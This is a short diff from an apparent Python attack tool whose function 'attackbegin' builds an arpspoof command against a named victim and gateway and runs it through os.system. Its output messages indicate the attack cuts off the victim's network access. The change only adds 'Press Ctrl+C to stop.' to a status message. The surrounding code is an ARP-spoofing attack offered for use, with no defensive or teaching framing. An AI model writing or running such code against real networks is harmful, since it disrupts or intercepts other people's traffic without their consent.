@@ -39,7 +39,7 @@ def attackbegin(intlmao,Victim,gatelmao):
 
 	#command1 = "arpspoof -i "+ (intlmao) + " -t " + (gatelmao) + " " + (Victim)
 	command2 = "arpspoof -i "+ (intlmao) + " -t " + (Victim) + " " + (gatelmao) + ">/dev/null 2>&1"
-	print("\nAttack starting...")
+	print("\nAttack starting...Press Ctrl+C to stop.")
 	#print(command2)
 	os.system(command2)
 	print("\nAttack finished. Victim's access will be restored in a bit.")
